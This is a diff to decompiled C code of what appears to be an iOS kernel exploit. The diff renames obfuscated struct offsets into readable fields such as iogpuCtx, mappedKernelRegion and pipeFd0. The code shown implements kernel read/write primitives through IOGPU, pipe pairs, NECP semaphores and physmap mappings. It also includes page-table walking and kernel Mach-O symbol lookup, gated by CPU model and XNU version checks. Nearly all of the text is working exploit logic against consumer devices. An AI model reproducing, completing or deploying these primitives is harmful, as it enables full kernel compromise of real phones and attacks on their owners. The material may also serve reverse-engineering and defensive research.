@@ -816,9 +816,9 @@ static bool krw_has_any_ready_method(struct_krwCtx *krwCtx)
                       && *(uint64_t *)&krwCtx->gap_0x100;
   bool hasPipePairKrw = krwCtx->krw_pipe_0 != -1
                      && krwCtx->krw_pipe_1 != -1
-                     && ((krwCtx->gap_0x1940 != -1 && krwCtx->gap_0x218)
-                      || (krwCtx->gap_0x1938 != -1 && krwCtx->gap_0x193C != -1));
-  bool hasTargetPortKrw = (unsigned int)(krwCtx->gap_0x1918_size4 + 1) >= 2;
+                     && ((krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218)
+                      || (krwCtx->pipeFd0 != -1 && krwCtx->pipeFd1 != -1));
+  bool hasTargetPortKrw = (unsigned int)(krwCtx->targetVmPort + 1) >= 2;
 
   return hasThreadStateKrw || hasIOConnectKrw || hasPipePairKrw || hasTargetPortKrw;
 }
@@ -4844,7 +4844,7 @@ __int64 __fastcall iogpu_kread(struct_krwCtx *krwCtx, __int16 a2, char *a3, unsi
   int v10; // [xsp+Ch] [xbp-24h] BYREF
 
   v10 = -1;
-  v5 = krwCtx->gap_0x50;
+  v5 = krwCtx->iogpuCtx;
   if ( !v5 )
     return 708609;
   if ( a5 )
@@ -4857,7 +4857,7 @@ __int64 __fastcall iogpu_kread(struct_krwCtx *krwCtx, __int16 a2, char *a3, unsi
   }
   else
   {
-    iogpu_kread_loop((uint64_t *)krwCtx->gap_0x50, a2, a3, a4);
+    iogpu_kread_loop((uint64_t *)krwCtx->iogpuCtx, a2, a3, a4);
   }
   return 0;
 }
@@ -4870,7 +4870,7 @@ __int64 __fastcall iogpu_kwrite(struct_krwCtx *krwCtx, __int16 a2, char *a3, uns
   int v10; // [xsp+Ch] [xbp-24h] BYREF
 
   v10 = -1;
-  v5 = (uint64_t *)krwCtx->gap_0x50;
+  v5 = (uint64_t *)krwCtx->iogpuCtx;
   if ( !v5 )
     return 708609;
   if ( a5 )
@@ -4883,7 +4883,7 @@ __int64 __fastcall iogpu_kwrite(struct_krwCtx *krwCtx, __int16 a2, char *a3, uns
   }
   else
   {
-    iogpu_kwrite_loop((uint64_t *)krwCtx->gap_0x50, a3, a2, a4);
+    iogpu_kwrite_loop((uint64_t *)krwCtx->iogpuCtx, a3, a2, a4);
   }
   return 0;
 }
@@ -4898,7 +4898,7 @@ __int64 __fastcall iogpu_kread2(struct_krwCtx *krwCtx, unsigned __int64 a2, void
 
   result = 708609;
   v11 = -1;
-  v7 = (uint64_t *)krwCtx->gap_0x50;
+  v7 = (uint64_t *)krwCtx->iogpuCtx;
   if ( v7 && (vm_page_mask & a2) + a4 <= vm_page_size )
   {
     v10 = a4;
@@ -4929,7 +4929,7 @@ __int64 __fastcall iogpu_kwrite2(struct_krwCtx *krwCtx, unsigned __int64 a2, con
 
   result = 708609;
   v11 = -1;
-  v7 = (uint64_t *)krwCtx->gap_0x50;
+  v7 = (uint64_t *)krwCtx->iogpuCtx;
   if ( v7 && (vm_page_mask & a2) + a4 <= vm_page_size )
   {
     v10 = a4;
@@ -5021,11 +5021,11 @@ LABEL_19:
   if ( !*v7 )
     *v7 = v6[2];
   v2 = 0;
-  *(uint64_t *)&krwCtx->gap_0x30 = (uint64_t)iogpu_kread;
-  *(uint64_t *)&krwCtx->gap_0x40 = (uint64_t)iogpu_kwrite;
-  *(uint64_t *)&krwCtx->gap_0x38 = (uint64_t)iogpu_kread2;
-  *(uint64_t *)&krwCtx->gap_0x48 = (uint64_t)iogpu_kwrite2;
-  *(uint64_t *)&krwCtx->gap_0x50 = (uint64_t)v6;
+  *(uint64_t *)&krwCtx->iogpuKreadFn = (uint64_t)iogpu_kread;
+  *(uint64_t *)&krwCtx->iogpuKwriteFn = (uint64_t)iogpu_kwrite;
+  *(uint64_t *)&krwCtx->iogpuKread2Fn = (uint64_t)iogpu_kread2;
+  *(uint64_t *)&krwCtx->iogpuKwrite2Fn = (uint64_t)iogpu_kwrite2;
+  *(uint64_t *)&krwCtx->iogpuCtx = (uint64_t)v6;
   v6[183] = read_task_kobject_physmap;
   v6[184] = get_read_task_port_kobject;
   v6[185] = check_task_port_type;
@@ -5123,7 +5123,7 @@ __int64 __fastcall free_iogpu_krw_ctx(struct_krwCtx *krwCtx)
 {
   __int64 v1; // x0
 
-  v1 = krwCtx->gap_0x50;
+  v1 = krwCtx->iogpuCtx;
   if ( !v1 )
     return 708609;
   free_vm_page_array_list(v1);
@@ -5138,17 +5138,17 @@ __int64 __fastcall iogpu_teardown_ctx(struct_krwCtx *krwCtx)
   int v4; // [xsp+Ch] [xbp-14h] BYREF
 
   v4 = -1;
-  v1 = krwCtx->gap_0x50;
+  v1 = krwCtx->iogpuCtx;
   if ( !v1 )
     return 708609;
   result = fd_open_dev_null(&v4);
   if ( !(uint32_t)result )
   {
-    krwCtx->gap_0x50 = 0;
-    krwCtx->gap_0x30 = 0;
-    krwCtx->gap_0x38 = 0;
-    krwCtx->gap_0x40 = 0;
-    krwCtx->gap_0x48 = 0;
+    krwCtx->iogpuCtx = 0;
+    krwCtx->iogpuKreadFn = 0;
+    krwCtx->iogpuKread2Fn = 0;
+    krwCtx->iogpuKwriteFn = 0;
+    krwCtx->iogpuKwrite2Fn = 0;
     teardown_iogpu_vm_copy(v1);
     fd_close(v4);
     return 0;
@@ -5169,7 +5169,7 @@ __int64 __fastcall create_iogpu_shmem_entry(struct_krwCtx *krwCtx, uint32_t *a2,
 
   *(uint64_t *)object_handle = 0;
   name = 0;
-  v5 = (uint64_t *)krwCtx->gap_0x50;
+  v5 = (uint64_t *)krwCtx->iogpuCtx;
   if ( !v5 )
     return 708609;
   v11 = 163857;
@@ -5650,20 +5650,20 @@ __int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *krwCtx, uint32_t *a2)
                   if ( !v6 )
                   {
                     v17 = v18;
-                    *(uint64_t *)&krwCtx->gap_0x30 = (uint64_t)iogpu_kread;
-                    *(uint64_t *)&krwCtx->gap_0x40 = (uint64_t)iogpu_kwrite;
-                    *(uint64_t *)&krwCtx->gap_0x38 = (uint64_t)iogpu_kread2;
-                    *(uint64_t *)&krwCtx->gap_0x48 = (uint64_t)iogpu_kwrite2;
-                    *(uint64_t *)&krwCtx->gap_0x50 = v17;
+                    *(uint64_t *)&krwCtx->iogpuKreadFn = (uint64_t)iogpu_kread;
+                    *(uint64_t *)&krwCtx->iogpuKwriteFn = (uint64_t)iogpu_kwrite;
+                    *(uint64_t *)&krwCtx->iogpuKread2Fn = (uint64_t)iogpu_kread2;
+                    *(uint64_t *)&krwCtx->iogpuKwrite2Fn = (uint64_t)iogpu_kwrite2;
+                    *(uint64_t *)&krwCtx->iogpuCtx = v17;
                     fd_close(v20);
                     v20 = -1;
                     v6 = krw_read_validation(krwCtx, 0);
                     if ( !v6 )
                     {
-                      *(uint64_t *)&krwCtx->gap_0x30 = 0;
+                      *(uint64_t *)&krwCtx->iogpuKreadFn = 0;
                       v6 = krw_write_validation(krwCtx);
                       if ( !v6 )
-                        *(uint64_t *)&krwCtx->gap_0x40 = 0;
+                        *(uint64_t *)&krwCtx->iogpuKwriteFn = 0;
                     }
                   }
                 }
@@ -5706,7 +5706,7 @@ __int64 __fastcall get_iogpu_physmap_base(struct_krwCtx *krwCtx)
 {
   __int64 v1; // x8
 
-  v1 = krwCtx->gap_0x50;
+  v1 = krwCtx->iogpuCtx;
   if ( v1 )
     return *(uint64_t *)(v1 + 1336);
   else
@@ -5760,10 +5760,10 @@ __int64 __fastcall iogpu_kernel_read_op(struct_krwCtx *krwCtx, unsigned __int64 
   v6 = 708619;
   if ( !(unsigned int)acquire_write_semaphore_lock(krwCtx, 7u, 0x2710u) )
   {
-    v8 = *(uint64_t *)&krwCtx->gap_0x118;
+    v8 = *(uint64_t *)&krwCtx->mappedKernelRegion;
     if ( v8 )
     {
-      if ( *(uint64_t *)&krwCtx->gap_0x120 )
+      if ( *(uint64_t *)&krwCtx->mappedKernelSize )
       {
         v9 = *(uint64_t *)(v8 + 344);
         if ( v9 )
@@ -5828,8 +5828,8 @@ __int64 __fastcall iogpu_kernel_read_op(struct_krwCtx *krwCtx, unsigned __int64 
               memory_barrier_dsb_isb();
               MEMORY[0x400000008] = v30[0];
               semaphore_timedwait_ns(krwCtx, 0x2710u);
-              v24 = *(uint64_t *)&krwCtx->gap_0x118;
-              if ( v24 && *(uint64_t *)&krwCtx->gap_0x120 )
+              v24 = *(uint64_t *)&krwCtx->mappedKernelRegion;
+              if ( v24 && *(uint64_t *)&krwCtx->mappedKernelSize )
                 *(uint64_t *)(v24 + 344) = v9;
 LABEL_6:
               v7 = 163878;
@@ -9473,7 +9473,7 @@ __int64 __fastcall ioconnect_kread_physmap(struct_krwCtx *krwCtx, __int64 a2, __
   uint64_t __src[2]; // [xsp+80h] [xbp-70h] BYREF
 
   result = 708642;
-  v6 = krwCtx->gap_0x50;
+  v6 = krwCtx->iogpuCtx;
   if ( !v6 )
     return 708609;
   v7 = *(uint64_t **)(v6 + 13384);
@@ -13923,10 +13923,10 @@ __int64 __fastcall krw_physmap_ctx_init(struct_krwCtx *krwCtx)
     return 708617;
   v4 = v3;
   krwCtx->gap_0x1D58 = v3;
-  v5 = krwCtx->gap_0x118_size8byte;
+  v5 = krwCtx->mappedKernelRegion_size8byte;
   if ( v5 )
   {
-    if ( krwCtx->gap_0x120_size8byte )
+    if ( krwCtx->mappedKernelSize_size8byte )
     {
       v6 = *(uint64_t *)(v5 + 352);
       if ( v6 )
@@ -13971,8 +13971,8 @@ __int64 __fastcall krw_physmap_ctx_init(struct_krwCtx *krwCtx)
     DWORD2(v10->oword90) = v14;
     DWORD2(v10->oword30) = v15;
     v1 = 163863;
-    if ( iosurface_physmap_setup_bool(v9, krwCtx->gap_0x1918_size4, address[0], 0)
-      && iosurface_physmap_setup_bool((__int64)v10, krwCtx->gap_0x1918_size4, target_address[0], 0) )
+    if ( iosurface_physmap_setup_bool(v9, krwCtx->targetVmPort, address[0], 0)
+      && iosurface_physmap_setup_bool((__int64)v10, krwCtx->targetVmPort, target_address[0], 0) )
     {
       v343 = xmmword_42FA0;
       *(__int128 *)v316 = xmmword_42FB0;
@@ -15497,7 +15497,7 @@ LABEL_431:
     v1 = 708617;
     v281 = krwCtx->gap_0x1D58;
     *(uint32_t *)inputStruct = 552;
-    if ( krwCtx->gap_0x118_size8byte && krwCtx->gap_0x120_size8byte )
+    if ( krwCtx->mappedKernelRegion_size8byte && krwCtx->mappedKernelSize_size8byte )
     {
       v282 = alloc_physmap_page(krwCtx, (unsigned int *)inputStruct);
       if ( !v282 )
@@ -15508,7 +15508,7 @@ LABEL_431:
         v1 = 163856;
         goto LABEL_27;
       }
-      *(uint64_t *)(krwCtx->gap_0x118_size8byte + 352LL) = v283;
+      *(uint64_t *)(krwCtx->mappedKernelRegion_size8byte + 352LL) = v283;
     }
     return 0;
   }
@@ -18247,13 +18247,13 @@ __int64 __fastcall alloc_vm_page(struct_krwCtx *krwCtx)
 
   v4 = 0;
   v2 = vm_page_size;
-  if ( krwCtx->gap_0x118 && krwCtx->gap_0x120 )
+  if ( krwCtx->mappedKernelRegion && krwCtx->mappedKernelSize )
     return 0;
   result = alloc_vm_page_mem_entry(krwCtx, 0x10u, vm_page_size, &v4);
   if ( !(uint32_t)result )
   {
-    krwCtx->gap_0x118 = v4;
-    krwCtx->gap_0x120 = v2;
+    krwCtx->mappedKernelRegion = v4;
+    krwCtx->mappedKernelSize = v2;
   }
   return result;
 }
@@ -18346,9 +18346,9 @@ LABEL_13:
     krwCtx->krw_pipe_1 = v13;
     v14 = krwCtx->xnuVersionPacked;
     if ( v14 > XNU_VERSION_PACKED(7195, 42, 0, 1023, 1023) && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v14 > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023)) )
-      krwCtx->gap_0x1940_size4 = v23;
+      krwCtx->iosurfaceFd_size4 = v23;
     else
-      krwCtx->gap_0x1938 = v23;
+      krwCtx->pipeFd0 = v23;
     if ( !fstat(v13, &v20) )
     {
       tv_sec = v20.st_atimespec.tv_sec;
@@ -18363,13 +18363,13 @@ LABEL_13:
         v18 = ((unsigned __int64)v20.st_atimespec.tv_nsec >> 40) * krwCtx->pageSizeOrSomething;
         if ( v18 && (krwCtx->pageMask & v18) == 0 )
           krwCtx->gap_0x19E0_size8 = v18;
-        if ( krwCtx->krw_pipe_0 != -1 && krwCtx->krw_pipe_1 != -1 && krwCtx->gap_0x1940_size4 != -1 )
+        if ( krwCtx->krw_pipe_0 != -1 && krwCtx->krw_pipe_1 != -1 && krwCtx->iosurfaceFd_size4 != -1 )
         {
           if ( krwCtx->gap_0x218 )
           {
             if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) && !(unsigned int)alloc_vm_page(krwCtx) )
             {
-              v19 = *(uint64_t *)(krwCtx->gap_0x118 + 256LL);
+              v19 = *(uint64_t *)(krwCtx->mappedKernelRegion + 256LL);
               if ( validate_kaddr_range(krwCtx, v19) )
                 krwCtx->gap_0x220 = v19;
             }
@@ -18889,8 +18889,8 @@ __int64 __fastcall alloc_vm_page_v2(struct_krwCtx *krwCtx)
   if ( !(uint32_t)result )
   {
     v3 = vm_page_size;
-    krwCtx->gap_0x118 = v4;
-    krwCtx->gap_0x120 = v3;
+    krwCtx->mappedKernelRegion = v4;
+    krwCtx->mappedKernelSize = v3;
   }
   return result;
 }
@@ -18940,7 +18940,7 @@ bool __fastcall krw_setup_voucher(struct_krwCtx *krwCtx)
           v17[1] = v4;
           if ( v17[0] != -1 && v4 != -1 )
           {
-            v5 = krwCtx->gap_0x1940;
+            v5 = krwCtx->iosurfaceFd;
             if ( v5 != -1 && krwCtx->gap_0x218 )
             {
               v6 = 3;
@@ -18984,12 +18984,12 @@ LABEL_13:
                   return true;
               }
             }
-            if ( krwCtx->gap_0x1938 != -1 )
+            if ( krwCtx->pipeFd0 != -1 )
             {
-              v5 = krwCtx->gap_0x193C;
+              v5 = krwCtx->pipeFd1;
               if ( v5 != -1 )
               {
-                v17[2] = krwCtx->gap_0x1938;
+                v17[2] = krwCtx->pipeFd0;
                 v6 = 4;
                 v7 = 3;
                 goto LABEL_13;
@@ -22201,8 +22201,7 @@ __n128 __fastcall pgtable_walk_full(struct_krwCtx *krwCtx, unsigned __int64 a2, 
   unsigned __int64 v35; // x25
   __int64 v36; // x11
   __int64 v37; // x8
-  __int64 v38; // x8
-  __int128 v39; // q1
+  PgtableWalkCacheEntry *v38; // x8
   unsigned __int64 v40; // [xsp+0h] [xbp-50h] BYREF
   unsigned __int64 v41; // [xsp+8h] [xbp-48h] BYREF
 
@@ -22216,19 +22215,17 @@ __n128 __fastcall pgtable_walk_full(struct_krwCtx *krwCtx, unsigned __int64 a2, 
   *(__int128 *)(a3 + 16) = 0u;
   do
   {
-    v9 = *(uint64_t *)(krwCtx + v8 + 1512);
+    PgtableWalkCacheEntry *cacheEntry = &krwCtx->pgtableWalkCache[v8 / 40];
+    v9 = cacheEntry->tableKva;
     if ( !v9 )
       break;
-    v10 = *(uint64_t *)(krwCtx + v8 + 1520);
-    if ( v10 <= a2 && v10 + *(unsigned int *)(krwCtx + v8 + 1528) > a2 )
+    v10 = cacheEntry->virtualBase;
+    if ( v10 <= a2 && v10 + cacheEntry->span > a2 )
     {
-      if ( kreadbuf_universal(krwCtx, v9, 8u, (void *)(krwCtx + v8 + 1544), a4) )
+      if ( kreadbuf_universal(krwCtx, v9, 8u, &cacheEntry->descriptor, a4) )
       {
-        result = *(__n128 *)(krwCtx + v8 + 1512);
-        v29 = *(__int128 *)(krwCtx + v8 + 1528);
-        *(uint64_t *)(a3 + 32) = *(uint64_t *)(krwCtx + v8 + 1544);
-        *(__n128 *)a3 = result;
-        *(__int128 *)(a3 + 16) = v29;
+        memcpy((void *)a3, cacheEntry, sizeof(*cacheEntry));
+        result = *(__n128 *)a3;
         return result;
       }
       break;
@@ -22236,7 +22233,7 @@ __n128 __fastcall pgtable_walk_full(struct_krwCtx *krwCtx, unsigned __int64 a2, 
     v8 += 40;
   }
   while ( v8 != 640 );
-  if ( !krwCtx->gap_0x5D0 )
+  if ( !krwCtx->pgtableRootKva )
   {
     v24 = krw_lookup_and_process_entry(krwCtx);
     TRACE_DMAFAIL("pgtable_walk_full roots init ctx=%llx va=%llx ttbr0_pa_ptr=%llx off=%x page=%x flags=%x\n",
@@ -22273,15 +22270,15 @@ __n128 __fastcall pgtable_walk_full(struct_krwCtx *krwCtx, unsigned __int64 a2, 
                   (unsigned long long)v27,
                   (unsigned long long)v28,
                   v26);
-    krwCtx->gap_0x5D0 = v27;
-    krwCtx->gap_0x5D8 = v28;
-    krwCtx->gap_0x5E0_size4 = v26;
+    krwCtx->pgtableRootKva = v27;
+    krwCtx->pgtableRootDelta = v28;
+    krwCtx->pgtableRootSpan = v26;
     map_physpage_for_kobj(krwCtx, v27);
   }
   if ( krwCtx->pageSizeOrSomething == 4096 || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A8) )
   {
-    v12 = krwCtx->gap_0x5D0;
-    v13 = krwCtx->gap_0x5D8;
+    v12 = krwCtx->pgtableRootKva;
+    v13 = krwCtx->pgtableRootDelta;
     v14 = translate_physmap_addr_via_segments(krwCtx, v12, v13, v13);
     v15 = (a2 >> 27) & 0x7F8;
     v16 = kreadbuf_universal(krwCtx, v12 + v15, 8u, &v41, a4);
@@ -22351,8 +22348,8 @@ LABEL_57:
   {
     if ( krwCtx->pageSizeOrSomething != 0x4000 )
       return result;
-    v30 = krwCtx->gap_0x5D0;
-    v31 = krwCtx->gap_0x5D8;
+    v30 = krwCtx->pgtableRootKva;
+    v31 = krwCtx->pgtableRootDelta;
     has_flag = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK | KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER);
     v33 = 2047;
     if ( !has_flag )
@@ -22426,18 +22423,15 @@ LABEL_58:
   {
     result = *(__n128 *)a3;
     v37 = 0;
-    while ( *(uint64_t *)(krwCtx + 1512 + v37) )
+    while ( krwCtx->pgtableWalkCache[v37 / 40].tableKva )
     {
       v37 += 40;
       if ( v37 == 640 )
         return result;
     }
-    v38 = krwCtx + v37 + 1512;
+    v38 = &krwCtx->pgtableWalkCache[v37 / 40];
     result = *(__n128 *)a3;
-    v39 = *(__int128 *)(a3 + 16);
-    *(uint64_t *)(v38 + 32) = *(uint64_t *)(a3 + 32);
-    *(__n128 *)v38 = result;
-    *(__int128 *)(v38 + 16) = v39;
+    memcpy(v38, (const void *)a3, sizeof(*v38));
   }
   return result;
 }
@@ -22828,7 +22822,7 @@ LABEL_111:
       macho_find_text_section(v8, v46);
       if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
       {
-        v18 = krwCtx->gap_0x1D38;
+        v18 = krwCtx->kextMachoCtx2;
         if ( v18 )
         {
 LABEL_39:
@@ -22839,14 +22833,14 @@ LABEL_39:
                  0);
           if ( v8 )
           {
-            v8 = (unsigned __int64)find_kernel_func_by_branch(krwCtx->gap_0x1D38, (__int64 *)(v8 - 4), 0);
+            v8 = (unsigned __int64)find_kernel_func_by_branch(krwCtx->kextMachoCtx2, (__int64 *)(v8 - 4), 0);
             if ( v8 )
             {
-              v8 = macho_read_u64_thunk(krwCtx->gap_0x1D38, v8 + 32);
+              v8 = macho_read_u64_thunk(krwCtx->kextMachoCtx2, v8 + 32);
               if ( v8 )
               {
                 v19 = v8;
-                v20 = krwCtx->gap_0x1D38;
+                v20 = krwCtx->kextMachoCtx2;
 LABEL_102:
                 v8 = macho_read_u64_thunk(v20, v19);
 LABEL_113:
@@ -22866,7 +22860,7 @@ LABEL_115:
           LODWORD(v8) = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT);
           if ( (uint32_t)v8 )
           {
-            v37 = *(uint64_t *)(krwCtx->gap_0x118 + 328LL);
+            v37 = *(uint64_t *)(krwCtx->mappedKernelRegion + 328LL);
             if ( v37 )
             {
               LODWORD(v44[0]) = 0;
@@ -22886,8 +22880,8 @@ LABEL_115:
                     {
                       v18 = v8;
                       krw_ctx_zero_fields((struct_a1 *)v8, krwCtx);
-                      v39 = *(__int128 *)((char *)krwCtx + 336);
-                      *(__int128 *)(v18 + 112) = *(__int128 *)((char *)krwCtx + 320);
+                      v39 = *(__int128 *)&krwCtx->gap_0x150;
+                      *(__int128 *)(v18 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
                       *(__int128 *)(v18 + 128) = v39;
                       *(uint64_t *)(v18 + 144) = krwCtx->gap_0x160_size8;
                       *(uint32_t *)(v18 + 152) = krwCtx->gap_0x178_size4;
@@ -22895,7 +22889,7 @@ LABEL_115:
                       LODWORD(v8) = iosurface_physmap_setup_bool(v18, 0, v38, 0);
                       if ( (uint32_t)v8 )
                       {
-                        krwCtx->gap_0x1D38 = v18;
+                        krwCtx->kextMachoCtx2 = v18;
                         goto LABEL_39;
                       }
                     }
@@ -23920,10 +23914,10 @@ __int64 __fastcall dmaFail_set_power_state(struct_krwCtx *krwCtx, int a2)
 
   if ( a2 )
   {
-    v3 = krwCtx->gap_0x118;
+    v3 = krwCtx->mappedKernelRegion;
     if ( v3 )
     {
-      if ( krwCtx->gap_0x120 )
+      if ( krwCtx->mappedKernelSize )
       {
         v4 = *(uint64_t *)(v3 + 336);
         if ( v4 )
@@ -23936,10 +23930,10 @@ __int64 __fastcall dmaFail_set_power_state(struct_krwCtx *krwCtx, int a2)
     }
     if ( (unsigned int)acquire_write_semaphore_lock(krwCtx, 4u, 0x3E8u) )
       return 0;
-    if ( krwCtx->gap_0x118 )
+    if ( krwCtx->mappedKernelRegion )
     {
-      if ( krwCtx->gap_0x120 )
-        *(uint64_t *)(krwCtx->gap_0x118 + 336LL) = mach_absolute_time();
+      if ( krwCtx->mappedKernelSize )
+        *(uint64_t *)(krwCtx->mappedKernelRegion + 336LL) = mach_absolute_time();
     }
   }
   else
@@ -24518,7 +24512,7 @@ __int64 __fastcall run_callback_with_physmap_write(struct_krwCtx *krwCtx, void (
         v8 = krwCtx->gap_0x18F0 + (unsigned int)((krwCtx->gap_0x37C_size4 + 1) * krwCtx->stride_0x168);
         if ( krwCtx->krw_pipe_0 == -1
           || krwCtx->krw_pipe_1 == -1
-          || krwCtx->gap_0x1940_size4 == -1
+          || krwCtx->iosurfaceFd_size4 == -1
           || !krwCtx->gap_0x218
           || krwCtx->gap_0xC )
         {
@@ -24540,7 +24534,7 @@ LABEL_11:
           a2(a3);
           if ( krwCtx->krw_pipe_0 == -1
             || krwCtx->krw_pipe_1 == -1
-            || krwCtx->gap_0x1940_size4 == -1
+            || krwCtx->iosurfaceFd_size4 == -1
             || !krwCtx->gap_0x218
             || krwCtx->gap_0xC )
           {
@@ -24633,10 +24627,10 @@ unsigned __int64 __fastcall find_appleevent_kaddr(struct_krwCtx *krwCtx)
   result = krwCtx->gap_0x5C0;
   if ( result )
     return result;
-  v3 = krwCtx->gap_0x118;
+  v3 = krwCtx->mappedKernelRegion;
   if ( v3 )
   {
-    if ( krwCtx->gap_0x120 )
+    if ( krwCtx->mappedKernelSize )
     {
       result = *(uint64_t *)(v3 + 304);
       if ( result )
@@ -24651,7 +24645,7 @@ LABEL_6:
   v5 = 6648;
   if ( !has_flag )
     v5 = 7448;
-  v6 = *(uint64_t *)((char *)krwCtx + v5);
+  v6 = has_flag ? (uint64_t)krwCtx->gap_0x19F8 : krwCtx->sandboxMachoCtx;
   if ( !v6 )
     return 0;
   macho_getsectbyname("__TEXT", v6, "__cstring", &v14);
@@ -24684,10 +24678,10 @@ LABEL_6:
       result = validate_kaddr_range(krwCtx, v10);
       if ( result )
       {
-        v12 = krwCtx->gap_0x118;
+        v12 = krwCtx->mappedKernelRegion;
         if ( v12 )
         {
-          if ( krwCtx->gap_0x120 )
+          if ( krwCtx->mappedKernelSize )
             *(uint64_t *)(v12 + 304) = result;
         }
         goto LABEL_6;
@@ -24864,7 +24858,7 @@ __int64 __fastcall find_macho_entry_by_name(struct_krwCtx *krwCtx, char *__s2, u
       return 1;
     }
   }
-  v10 = (char *)krwCtx->gap_0x1D10;
+  v10 = (char *)krwCtx->puafPagesBuf;
   if ( v10 )
   {
     v11 = krwCtx->gap_0x1D08_size4;
@@ -24884,8 +24878,8 @@ LABEL_6:
     }
     return 0;
   }
-  v14 = krwCtx->gap_0x118;
-  if ( !v14 || !krwCtx->gap_0x120 || (v15 = *(uint64_t *)(v14 + 264)) == 0 )
+  v14 = krwCtx->mappedKernelRegion;
+  if ( !v14 || !krwCtx->mappedKernelSize || (v15 = *(uint64_t *)(v14 + 264)) == 0 )
   {
     v16 = find_kernel_func_by_scan(krwCtx->gap_0x19F8);
     if ( !v16 )
@@ -24893,8 +24887,8 @@ LABEL_6:
     v15 = v16;
     if ( !validate_kaddr_range(krwCtx, v16) )
       return 0;
-    v17 = krwCtx->gap_0x118;
-    if ( v17 && krwCtx->gap_0x120 )
+    v17 = krwCtx->mappedKernelRegion;
+    if ( v17 && krwCtx->mappedKernelSize )
       *(uint64_t *)(v17 + 264) = v15;
   }
   if ( kread_u32(krwCtx, v15 + 20, &v26)
@@ -24947,7 +24941,7 @@ LABEL_6:
         }
         v11 = 0;
 LABEL_40:
-        krwCtx->gap_0x1D10 = (uint64_t)v10;
+        krwCtx->puafPagesBuf = (uint64_t)v10;
         krwCtx->gap_0x1D08_size4 = v11;
         goto LABEL_6;
       }
@@ -25375,8 +25369,8 @@ __int64 __fastcall release_write_semaphore_lock(struct_krwCtx *krwCtx, unsigned 
   __int64 v4; // x9
 
   result = 708616;
-  v4 = krwCtx->gap_0x118;
-  if ( v4 && krwCtx->gap_0x120 )
+  v4 = krwCtx->mappedKernelRegion;
+  if ( v4 && krwCtx->mappedKernelSize )
   {
     if ( a2 > 0x3F )
     {
@@ -25401,8 +25395,8 @@ __int64 __fastcall acquire_write_semaphore_lock(struct_krwCtx *krwCtx, unsigned 
   atomic_uchar *v10; // x25
 
   v3 = 708616;
-  v4 = krwCtx->gap_0x118;
-  if ( v4 && krwCtx->gap_0x120 )
+  v4 = krwCtx->mappedKernelRegion;
+  if ( v4 && krwCtx->mappedKernelSize )
   {
     if ( a2 > 0x3F )
     {
@@ -25493,8 +25487,8 @@ __int64 __fastcall sub_25334(struct_krwCtx *krwCtx, unsigned __int64 a2, void *a
   v5 = 708609;
   if ( krwCtx->krw_pipe_0 != -1
     && krwCtx->krw_pipe_1 != -1
-    && krwCtx->gap_0x1938 != -1
-    && krwCtx->gap_0x193C != -1
+    && krwCtx->pipeFd0 != -1
+    && krwCtx->pipeFd1 != -1
     && check_kaddr_in_physmap(krwCtx, a2) )
   {
     v17 = -1;
@@ -25519,7 +25513,7 @@ __int64 __fastcall sub_25334(struct_krwCtx *krwCtx, unsigned __int64 a2, void *a
         if ( (v14 ^ v13[0]) | (v15 ^ v13[1]) | (v16 ^ v13[2]) )
           v11 = 708628;
         else
-          v11 = fd_read((int *)&krwCtx->gap_0x1938, a3, a4);
+          v11 = fd_read((int *)&krwCtx->pipeFd0, a3, a4);
       }
     }
     if ( a5 )
@@ -25543,8 +25537,8 @@ __int64 __fastcall pipe_pair_krw(struct_krwCtx *krwCtx, unsigned __int64 a2, con
   v5 = 708609;
   if ( krwCtx->krw_pipe_0 != -1
     && krwCtx->krw_pipe_1 != -1
-    && krwCtx->gap_0x1938 != -1
-    && krwCtx->gap_0x193C != -1
+    && krwCtx->pipeFd0 != -1
+    && krwCtx->pipeFd1 != -1
     && check_kaddr_in_physmap(krwCtx, a2) )
   {
     v16 = -1;
@@ -25568,7 +25562,7 @@ __int64 __fastcall pipe_pair_krw(struct_krwCtx *krwCtx, unsigned __int64 a2, con
         if ( ((unsigned __int64)v14 ^ v13[0]) | (*((uint64_t *)&v14 + 1) ^ v13[1]) | (v15 ^ v13[2]) )
           test = 708628;
         else
-          test = fd_write((__int64)&krwCtx->gap_0x1938, a3, a4);
+          test = fd_write((__int64)&krwCtx->pipeFd0, a3, a4);
       }
     }
     if ( a5 )
@@ -26365,7 +26359,7 @@ __int64 __fastcall necp_semaphore_kread(struct_krwCtx *krwCtx, __int64 a2, char 
         goto LABEL_75;
       if ( krwCtx->krw_pipe_1 == -1 )
         goto LABEL_75;
-      if ( krwCtx->gap_0x1940_size4 == -1 )
+      if ( krwCtx->iosurfaceFd_size4 == -1 )
         goto LABEL_75;
       v30 = krwCtx->gap_0x218;
       if ( !v30 )
@@ -26612,7 +26606,7 @@ __int64 __fastcall necp_ioconnect_krw(struct_krwCtx *krwCtx, unsigned __int64 a2
   test = 708609;
   if ( krwCtx->krw_pipe_0 == -1
     || krwCtx->krw_pipe_1 == -1
-    || krwCtx->gap_0x1940_size4 == -1
+    || krwCtx->iosurfaceFd_size4 == -1
     || !krwCtx->gap_0x218
     || !check_kaddr_in_physmap(krwCtx, a2) )
   {
@@ -26664,7 +26658,7 @@ LABEL_27:
       goto LABEL_32;
     }
     memcpy((char *)&v22 + v14, (const void *)(a3 + v11), v15);
-    v18 = krwCtx->gap_0x1940_size4;
+    v18 = krwCtx->iosurfaceFd_size4;
     if ( !krwCtx->gap_0x220 )
       break;
     if ( ioctl(v18, 0x8004667C, &v22) )
@@ -27467,7 +27461,7 @@ __int64 __fastcall krw_read_validation(struct_krwCtx *krwCtx, char a2)
         v10 = 256;
     }
   }
-  if ( krwCtx->gap_0x30 && (a2 & 1) == 0 )
+  if ( krwCtx->iogpuKreadFn && (a2 & 1) == 0 )
   {
     v83 = 0;
     semaphore = 0;
